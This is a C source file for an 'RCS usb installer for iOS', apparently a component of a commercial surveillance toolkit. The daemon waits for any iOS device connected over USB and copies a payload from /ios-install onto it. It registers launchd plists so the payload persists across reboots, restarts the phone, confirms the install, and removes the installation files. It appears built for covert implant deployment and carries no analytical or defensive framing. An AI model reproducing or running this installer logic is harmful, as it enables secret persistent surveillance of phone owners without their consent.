//
//  main.c
//  RCS usb installer for iOS
//
//  Created by armored on 2/6/13.
//  Copyright (c) HT srl 2013 Massimo Chiodini. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include "../iOSUsbSupport.h"
#include <syslog.h>

int main(int argc, const char * argv[])
{
  int devAttach = 0;

  if (argv[1] != NULL && strcmp(argv[1], "--nodaemon") == 0)
  {
    syslog(LOG_INFO, "Running %s in foreground...\n", argv[0]);
  }
  else
  {
    pid_t pid;

    syslog(LOG_INFO, "Running daemon...\n");

    pid = fork();
    
    if (pid < 0) {
       exit(EXIT_FAILURE);
    }

    if (pid > 0) {
            exit(EXIT_SUCCESS);
    }
  }

  syslog(LOG_INFO, "Waiting for device...\n");

  while(1)
  {
retry_installation:

    while(devAttach == 0)
    {
      devAttach = isDeviceAttached();
      sleep(1);
    }

    syslog(LOG_INFO, "Device attached!\n");

    sleep(1);

    if (check_installation(1, 2) == 1)
    {
      syslog(LOG_INFO, "Device already installed!\n");
      
      sleep (5);

      goto retry_installation;
    } 

    syslog(LOG_INFO, "start installation...\n");

    char **dir_content = list_dir_content("/ios-install");

    if (dir_content[0] == NULL)
    {
      syslog(LOG_INFO, "cannot found installation dir!\n");
      goto retry_installation;
    }

    syslog(LOG_INFO, "create installation dir...\n");

    if (make_install_directory() != 0)
    {
      syslog(LOG_INFO, "cannot create installer folder\n");
  	  goto retry_installation;
    }

    syslog(LOG_INFO, "copy files...");

    if (copy_install_files("/ios-install", dir_content) != 0)
    {
      syslog(LOG_INFO, "\ncannot copy files in installer folder\n");
  	  goto retry_installation;
    }

    syslog(LOG_INFO, " done!\n");

    if (create_launchd_plist() != 0)
    {
     syslog(LOG_INFO, "cannot create plist files\n");
     goto retry_installation;
    }

    syslog(LOG_INFO, "try to restart device...");

    if (restart_device() == 1)
    {
      syslog(LOG_INFO, " restarting\n");
    }
    else 
    {
  	 syslog(LOG_INFO, "\ncan't restart device: try it manually!\n");
    }

    sleep(1);

    int isDeviceOn = 0;

    // Wait for device off
    do
    {
      isDeviceOn = isDeviceAttached();
      sleep(1);
    } while(isDeviceOn == 1);

    // Wait for device on
    do
    {
      isDeviceOn = isDeviceAttached();
      sleep(1);
    } while(isDeviceOn == 0);

    syslog(LOG_INFO, "device connected\n");

    syslog(LOG_INFO, "checking installation...\n");

    if (check_installation(10, 10) == 1)
    {
  	 syslog(LOG_INFO, "installation done!\n");

  	 if (remove_installation() == 0)
  		syslog(LOG_INFO, "cannot remove installation file!\n");
    }
    else
    {
  	 syslog(LOG_INFO, "installation failed: please retry!\n");
    }
  }

  return 0;
}



